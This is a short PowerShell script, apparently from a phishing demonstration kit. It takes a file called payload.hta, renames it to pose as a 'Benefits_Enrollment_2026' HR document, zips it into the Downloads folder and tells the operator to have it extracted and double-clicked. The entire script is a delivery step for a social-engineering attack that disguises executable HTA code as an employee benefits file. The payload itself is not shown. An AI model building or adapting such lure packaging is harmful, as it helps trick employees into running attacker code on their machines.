$root = $PSScriptRoot

$zip = Join-Path ([Environment]::GetFolderPath("UserProfile")) "Downloads\Benefits_Enrollment_2026.zip"
Remove-Item $zip -Force -ErrorAction SilentlyContinue
$tmp = "$root\_zip"
New-Item -ItemType Directory -Path $tmp -Force | Out-Null
Copy-Item "$root\payload.hta" "$tmp\Benefits_Enrollment_2026.hta" -Force
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::CreateFromDirectory($tmp, $zip)
Remove-Item $tmp -Recurse -Force

Write-Host "Ready. ZIP at: $zip"
Write-Host "Demo: extract ZIP, double-click the HTA file"
